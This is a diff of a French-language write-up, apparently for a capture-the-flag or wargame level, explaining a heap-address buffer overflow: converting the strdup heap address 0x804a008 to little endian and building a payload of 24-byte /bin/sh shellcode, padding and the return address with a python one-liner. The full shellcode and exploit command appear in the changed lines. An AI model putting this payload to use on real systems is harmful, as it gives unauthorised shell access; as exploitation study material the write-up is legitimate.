@@ -94,13 +94,14 @@ L'address est donc proteger
 
 Cependant apres reflexion il n'y pas que la stack dans la memoire mais aussi la heap. Plus haut dans  @sym.p il y avait le call strdup. strdup utilise malloc donc alloue sur la heap. La heap est contenue dans eax. Eax = rax mais en 32 bits
 
-On convertie en little endian. 0x804a008 devient donc \x08\xa0\x04\x08 pour convertir en little endian les deux derniers chiffre devienent le premier carac et ainsi de suite ce qui nous donne bien \x08\xa0\x04\x08
+On convertie en little endian l'addresse retourner. 0x804a008 devient donc \x08\xa0\x04\x08 pour convertir en little endian les deux derniers chiffre devienent le premier carac et ainsi de suite ce qui nous donne bien \x08\xa0\x04\x08
 
 Cependant ce ne sera pas suffisant car ils nous faudra du shellcode. En effet a l'insta du level1 ils n'y a pas d'execussion du bash.
 
-Donc on en cherche une sur internet "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" la source -> https://www.exploit-db.com/exploits/42428
+Donc on en cherche une sur internet "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" trouve sur shellstorm
+Pour le coup on peut trouver beaucoup de shellcode sur internet ce qui faut savoir c'est que fait le shellcode et ca taille.
 
-celui est de 24 bytes donc on va legerement modifier notre commande du python
+Pour le coup celui la est de 24 et est = /bin/sh en gros
 
 python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "o" * 56 + "\x08\xa0\x04\x08"' > /tmp/run
 
